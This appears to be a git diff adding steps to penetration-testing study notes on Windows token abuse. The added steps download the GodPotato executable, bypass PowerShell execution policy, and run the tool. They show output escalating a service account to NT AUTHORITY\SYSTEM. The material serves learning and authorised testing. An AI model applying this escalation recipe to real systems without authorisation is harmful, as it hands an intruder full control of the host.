@@ -32,6 +32,40 @@ GodPotato will boost your privilege from a service account to `NT AUTHORITY\SYST
 
 According to [the maker](https://medium.com/@iamkumarraj/godpotato-empowering-windows-privilege-escalation-techniques-400b88403a71), GodPotato abuses flaws in the `rpcss` service which is responsible for making *remote procedure calls*.
 ![](../../../cybersecurity-pics/token-abuse-2.png)
+##### STEPS
+1. Make sure you get the right executable. Usually, [GodPotato-NET4](https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe) works for me
+2. Infiltrate it onto your box
+3. Set execution policy w/ `powershell -ep bypass`
+4. Run with test command `./GodPotato.exe -cmd 'cmd /c whoami'` should return:
+```powershell
+PS C:\Windows\ServiceProfiles\MSSQL$SQLEXPRESS> ./gp2.exe -cmd 'cmd /c whoami'
+[*] CombaseModule: 0x140706512961536
+[*] DispatchTable: 0x140706515548488
+[*] UseProtseqFunction: 0x140706514843200
+[*] UseProtseqFunctionParamCount: 6
+[*] HookRPC
+[*] Start PipeServer
+[*] CreateNamedPipe \\.\pipe\729ee178-3923-44cd-bc86-41a3b3f36942\pipe\epmapper
+[*] Trigger RPCSS
+[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
+[*] DCOM obj IPID: 00003002-0d7c-ffff-76c7-f6b446467beb
+[*] DCOM obj OXID: 0xd8beb9e789d76e45
+[*] DCOM obj OID: 0xcc90150dddaf4482
+[*] DCOM obj Flags: 0x281
+[*] DCOM obj PublicRefs: 0x0
+[*] Marshal Object bytes len: 100
+[*] UnMarshal Object
+[*] Pipe Connected!
+[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
+[*] CurrentsImpersonationLevel: Impersonation
+[*] Start Search System Token
+[*] PID : 940 Token:0x748  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
+[*] Find System Token : True
+[*] UnmarshalObject: 0x80070776
+[*] CurrentUser: NT AUTHORITY\SYSTEM
+[*] process start with pid 5156
+nt authority\system         # <---------------------------------------------------
+```
 ### `SeAssignPrimaryPrivilege`
 This privilege is *very similar to `SeImpersonatePrivilege`* and will use the same method to get a privileged token. In addition to impersonating any token, this privilege also allows the user to *assign a [Primary Token](../../../../OSCP/windows-privesc/security-mechanisms/access-tokens.md#Primary%20Tokens)* to a new or suspended process.
 
